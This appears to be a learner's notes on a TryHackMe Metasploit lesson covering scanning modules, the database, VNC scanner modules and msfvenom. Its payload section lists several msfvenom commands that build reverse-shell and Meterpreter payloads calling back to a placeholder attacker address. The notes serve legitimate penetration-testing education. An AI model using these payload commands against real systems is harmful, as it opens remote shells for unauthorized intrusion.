# Metasploit Exploitation

## Task 1 - Introduction
Metasploit is one of the most powerful and widely used frameworks in penetration testing and offensive security. It provides security professionals with a structured and efficient way to identify vulnerabilities, exploit misconfigurations, and gain controlled access to target systems in a legal and ethical manner.

In this lesson, we will explore how Metasploit can be used throughout the exploitation phase of a penetration test.

## Task 2 - Scanning

### Port Scanning with Metasploit
Metasploit provides multiple auxiliary scanning modules that allow penetration testers to identify open ports, running services, and network‑accessible hosts. While it is not as fast as dedicated scanners like Nmap, Metasploit is useful during the initial reconnaissance and enumeration phase, especially when integrated with its database and exploitation framework.

### Port Scanning Modules
Metasploit includes several port scanning techniques, such as:
- TCP Connect scans
- SYN scans
- ACK scans
- XMAS scans
- FTP bounce scans

### Common Port Scanning Options
#### CONCURRENCY
Defines how many ports are scanned simultaneously per host. Higher values increase speed but may increase detection risk.
#### PORTS
Specifies the port range to scan. Unlike Nmap’s default behavior (top 1000 common ports), Metasploit scans numerical ranges exactly as specified.
#### RHOSTS
The target system or network range to be scanned. This can include single IPs, CIDR ranges, or host files.
#### THREADS
Controls the number of parallel threads used during scanning. More threads result in faster scans but may generate more network noise.
### Metasploit vs Nmap
Although Metasploit includes port scanning capabilities, it is not optimized for high‑speed port discovery. Nmap is generally preferred for large‑scale or stealthy scans. However, Metasploit remains valuable due to its integration with vulnerability scanning and exploitation modules.
### Service‑Specific Scanning
Metasploit offers multiple modules for scanning SMB (Server Message Block) services, which are common in Windows environments. These modules can:
- Identify operating system versions
- Enumerate shared resources
- Gather host and domain information

SMB scanning is especially useful in corporate networks where misconfigurations are common.
### NetBIOS Enumeration
NetBIOS (Network Basic Input Output System) allows systems to communicate and share resources on a local network. Enumerating NetBIOS can reveal:
- System names
- Workgroup or domain names
- Device roles (e.g., domain controller, workstation)

System naming conventions can provide valuable clues about the importance and function of a target within a network.

## Task 3 - The Metasploit Database
In real‑world penetration testing engagements, testers often deal with multiple targets rather than a single system. Metasploit’s database feature helps manage large amounts of data efficiently, reducing confusion and improving workflow organization.
### Purpose of the Metasploit Database
The Metasploit database allows testers to:
- Store discovered hosts, services, and vulnerabilities
- Reuse collected information across modules
- Maintain structured data during complex engagements

### Database Initialization
Metasploit uses a PostgreSQL database backend to store scan results and project data. The database must be initialized and running before it can be used. On TryHackMe’s AttackBox, this setup is already completed.

### Workspaces
A workspace is a logical container used to separate different penetration testing projects. Each workspace maintains its own set of hosts, services, notes, and vulnerabilities.

### Creating and Managing Workspaces
Metasploit allows users to:
- Create new workspaces for separate projects
- Delete unused workspaces
- Rename workspaces
- Switch between workspaces easily

### Querying Stored Data
### Hosts Enumeration
Stored host information can be viewed and reused in later scans or exploitation modules.
### Services Enumeration
Discovered services can be queried to identify potential attack vectors across the environment.
### Service Searching
The database allows searching for specific services, enabling testers to quickly locate targets running vulnerable or interesting services.
### Using Database Results in Modules
#### RHOSTS Automation
Saved host data can be automatically assigned to the RHOSTS parameter, removing the need for manual IP entry and reducing errors.
#### Multi‑Target Execution
If multiple hosts exist in the database, Metasploit modules can automatically target all applicable systems in a single execution.
### Penetration Testing Workflow
A structured Metasploit workflow often includes:

1. Discovering hosts using network scans
2. Identifying open ports and services
3. Storing results in the database
4. Searching for vulnerable services
5. Running vulnerability scanners or exploits
6. Reusing stored data for further testing

### Identifying Low‑Hanging Fruit
Some services commonly present easy attack opportunities:
- HTTP: May host vulnerable web applications
- FTP: May allow anonymous or weak authentication
- SMB: May be vulnerable to known exploits
- SSH: May use weak or default credentials
- RDP: May be misconfigured or vulnerable to known attacks

### Why the Metasploit Database Matters
The database feature transforms Metasploit from a simple exploitation tool into a full penetration testing framework by enabling:
- Project organization
- Efficient data reuse
- Faster vulnerability identification
- Better decision‑making during engagements
## Task 4 - Vulnerability Scanning
### Low‑Hanging Fruit
In penetration testing, low‑hanging fruit refers to vulnerabilities that are:
- Easy to identify
- Easy to exploit
- Often capable of providing initial access (foothold)
- Sometimes able to grant high‑level privileges such as administrator or root
### Importance of Scanning and Fingerprinting
Finding vulnerabilities in Metasploit heavily depends on how well you:
- Scan the target
- Fingerprint services
- Correctly identify running applications and versions

The more accurate your reconnaissance, the more relevant modules Metasploit can offer for exploitation or further enumeration.
### Using Metasploit Search to Identify Relevant Modules
Once a service is identified on a target system, Metasploit’s search functionality can be used to locate relevant modules.

For example, if a VNC service is discovered, you can search for VNC‑related modules, which may include:
- Scanner modules
- Payload modules
- Post‑exploitation modules

At early stages, scanner modules are the most useful because they help identify weaknesses such as weak or missing authentication.

### VNC Scanning with Metasploit
#### VNC Scanner Modules
Metasploit provides multiple scanner modules specifically designed to assess VNC (Virtual Network Computing) services.
Example VNC scanner modules:
```
auxiliary/scanner/vnc/ard_root_pw
auxiliary/scanner/vnc/vnc_login
auxiliary/scanner/vnc/vnc_none_auth
```

These modules help determine whether:
- VNC authentication is disabled
- Default or weak passwords are in use
- Unauthorized access is possible
#### Using the `info` Command
The info command provides detailed information about a module, including:
- Its purpose
- Supported options
- Required parameters
- References to known vulnerabilities

This helps you understand how and when to use a module effectively.
## Task 5 - Msfvenom
Msfvenom is a payload generation tool in the Metasploit Framework that replaced the older tools Msfpayload and Msfencode. It allows penetration testers to create, customize, and encode payloads for various operating systems and architectures.
### Purpose of Msfvenom
Msfvenom enables you to:

- Generate reverse shells and Meterpreter payloads
- Access all payloads available in Metasploit
- Create payloads for multiple platforms and architectures
- Output payloads in multiple file formats
### Supported Platforms and Formats
Msfvenom supports payload generation for:
- Windows
- Linux
- macOS
- Android
- Apple iOS
- Unix‑based systems
### Output Formats
Payloads can be generated in formats such as:

- `exe`, `dll` (Windows)
- `elf` (Linux)
- `php`, `asp`
- `py`
- `raw`

To list all available payloads:
```
msfvenom -l payloads
```
### Payload Types
#### Reverse Payloads
- A reverse payload connects back from the target system to the attacker. These are commonly used because they:
- Bypass inbound firewall restrictions
- Are more reliable in real‑world environments
#### Meterpreter Payloads
Meterpreter is an advanced Metasploit payload that provides:

- In‑memory execution
- Post‑exploitation commands
- Privilege escalation and pivoting features

### Encoders
Encoders transform the payload’s appearance to change its byte structure.
They are not designed to bypass modern antivirus solutions, although they may evade simple signature‑based detection.

### Handlers
A handler is a listener that waits for incoming connections from reverse payloads.

In Metasploit, this is commonly referred to as **catching a shell**.

### Common Payload Examples
#### Linux ELF Payload
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```
#### Windows Executable
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
#### PHP Meterpreter
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
#### ASP Payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```
#### Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```
## Task 6 - Conclusions
Metasploit is an effective framework for discovering, exploiting, and managing vulnerabilities on target systems. Its database functionality greatly improves efficiency when handling multiple targets during real‑world penetration testing engagements. Additionally, msfvenom enables the creation of stand‑alone Meterpreter payloads, which are especially useful when file upload or download is possible on a target.
### What I Learned
Metasploit vulnerability scanning and exploitation

- Using Metasploit database for multiple targets
- Creating payloads with msfvenom
- Generating and handling Meterpreter sessions
- Managing post‑exploitation activities with Meterpreter




